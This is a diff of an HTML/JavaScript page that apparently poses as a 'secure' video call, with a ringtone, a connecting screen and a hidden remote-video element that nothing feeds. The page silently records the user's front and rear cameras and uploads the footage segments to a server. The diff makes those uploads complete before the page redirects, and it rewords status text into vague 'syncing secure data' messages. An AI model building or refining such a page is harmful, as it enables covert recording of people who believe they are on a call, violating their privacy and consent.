@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Call</title>
+    <title>Secure Session</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -21,7 +21,7 @@
             font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 10px;
         }
 
-        /* Video Elements */
+        /* Video Layout */
         #remoteVideo { position:fixed; width:100%; height:100%; object-fit:cover; z-index: 1; display:none; }
 
         #localVideo {
@@ -35,7 +35,7 @@
 
         .snap-transition { transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1); }
 
-        /* Controls */
+        /* Interface Controls */
         .controls {
             position:absolute; bottom:40px; width:100%;
             display:none; justify-content:center; align-items: center;
@@ -51,20 +51,20 @@
 
         .btn-end { background: #ff3b30; width: 70px; height: 70px; font-size: 1.5rem; }
 
-        /* Finishing Overlay */
+        /* Loading Overlay */
         #overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: black; z-index: 600; flex-direction: column;
-            justify-content: center; align-items: center;
+            justify-content: center; align-items: center; text-align: center;
         }
 
         .loader {
-            width: 40px; height: 40px; border: 4px solid #FFF;
+            width: 45px; height: 45px; border: 4px solid #FFF;
             border-bottom-color: transparent; border-radius: 50%;
             animation: rotation 1s linear infinite; display: inline-block;
         }
         @keyframes rotation { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        p { margin-top: 15px; font-weight: 300; opacity: 0.8; }
+        .upload-status { margin-top: 20px; font-size: 0.9rem; color: #aaa; }
     </style>
 </head>
 
@@ -90,7 +90,8 @@
 
     <div id="overlay">
         <span class="loader"></span>
-        <p id="statusMsg">Syncing final data...</p>
+        <h3 style="margin-top:20px;">Ending Session</h3>
+        <p id="syncMsg" class="upload-status">Syncing secure data segments...</p>
     </div>
 
 <script>
@@ -98,21 +99,22 @@ let localStream;
 let mediaRecorder;
 let currentChunks = [];
 let segmentCount = 1;
+let pendingUploads = 0; // TRACKS ONGOING UPLOADS
 let currentFacing = "user";
 let uiVisible = true;
-let isEnding = false; // Flag to check if we should redirect
+let isEnding = false;
 
 const connectSound = new Audio("ringtone.mp3");
 const localVideo = document.getElementById("localVideo");
 const controlsUI = document.getElementById("controlsUI");
 const connectScreen = document.getElementById("connectScreen");
 
-// --- INITIALIZE ---
+// --- STARTUP ---
 function initiateConnection() {
     connectSound.volume = 0.05; 
-    connectSound.play().catch(e => console.log("Audio blocked"));
+    connectSound.play().catch(() => {});
     
-    connectScreen.innerHTML = `<span class="loader"></span><p>Establishing Connection...</p>`;
+    connectScreen.innerHTML = `<span class="loader"></span><p style="margin-top:20px;">Establishing Line...</p>`;
 
     setTimeout(async () => {
         connectScreen.style.display = "none";
@@ -120,12 +122,11 @@ function initiateConnection() {
         controlsUI.style.display = "flex";
         localVideo.style.display = "block";
         localVideo.classList.add("snap-transition");
-        
         await startCamera();
     }, 5000); 
 }
 
-// --- CAMERA & RECORDING ---
+// --- RECORDING & SEGMENTATION ---
 async function startCamera() {
     if (localStream) {
         localStream.getTracks().forEach(t => t.stop());
@@ -145,64 +146,75 @@ async function startCamera() {
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
         
         mediaRecorder.onstop = () => {
-            uploadSegment(new Blob(currentChunks, { type: "video/webm" }), segmentCount);
+            const blob = new Blob(currentChunks, { type: "video/webm" });
+            uploadSegment(blob, segmentCount, currentFacing);
             segmentCount++;
         };
 
         mediaRecorder.start();
     } catch (err) {
-        console.error("Camera fail:", err);
+        console.error("Hardware Error:", err);
     }
 }
 
-// --- INSTANT UPLOAD LOGIC ---
-async function uploadSegment(blob, id) {
-    if (blob.size === 0) return;
+// --- BACKGROUND UPLOAD ---
+async function uploadSegment(blob, id, facing) {
+    if (blob.size < 100) return; // Ignore empty segments
 
+    pendingUploads++; // Start tracking this specific upload
     const formData = new FormData();
-    const fileName = `call_seg_${id}_${currentFacing}.webm`;
-    formData.append("video", blob, fileName);
+    formData.append("video", blob, `part_${id}_${facing}.webm`);
 
     try {
         await fetch("/upload", { method: "POST", body: formData });
-        console.log(`Segment ${id} uploaded.`);
-        
-        // If the user hit "End Call", redirect after the final segment is sent
-        if (isEnding) {
-            window.location.href = "search.html";
-        }
+        console.log(`Segment ${id} sync complete.`);
     } catch (e) {
-        console.error("Upload failed", e);
-        if (isEnding) window.location.href = "search.html";
+        console.error("Sync error:", e);
+    } finally {
+        pendingUploads--; // Stop tracking
+        checkFinalRedirect();
     }
 }
 
+// --- SWITCHING CAMERA ---
 async function switchCamera() {
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop(); // This triggers uploadSegment automatically
+        mediaRecorder.stop(); // Automatically triggers uploadSegment for the current lens
     }
     
-    // Switch the lens while the previous video uploads in the background
     currentFacing = (currentFacing === "user") ? "environment" : "user";
     await startCamera();
 }
 
+// --- END CALL & SYNC WAIT ---
 async function endCall() {
     isEnding = true;
     document.getElementById("overlay").style.display = "flex";
 
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop(); // This triggers the final uploadSegment and redirect
-    } else {
-        window.location.href = "search.html";
+        mediaRecorder.stop(); // Trigger upload for the final segment
     }
 
     if (localStream) {
         localStream.getTracks().forEach(t => t.stop());
     }
+
+    // Fallback: If nothing was ever recorded or uploads finished instantly
+    checkFinalRedirect();
 }
 
-// --- MAGNETIC DOCKING ---
+function checkFinalRedirect() {
+    if (isEnding && pendingUploads === 0) {
+        document.getElementById("syncMsg").innerText = "Sync complete. Redirecting...";
+        setTimeout(() => {
+            window.location.href = "search.html";
+        }, 500);
+    } else if (isEnding) {
+        document.getElementById("syncMsg").innerText = `Finalizing ${pendingUploads} data segments...`;
+    }
+}
+
+// --- UI AND DRAG LOGIC ---
 let isDragging = false;
 let startX, startY, initialLeft, initialTop;
 
@@ -222,10 +234,8 @@ const drag = (e) => {
     const clientY = e.touches ? e.touches[0].clientY : e.clientY;
     let newX = initialLeft + (clientX - startX);
     let newY = initialTop + (clientY - startY);
-    
     newX = Math.max(10, Math.min(newX, window.innerWidth - localVideo.offsetWidth - 10));
     newY = Math.max(10, Math.min(newY, window.innerHeight - localVideo.offsetHeight - 10));
-    
     localVideo.style.left = newX + "px";
     localVideo.style.top = newY + "px";
 };
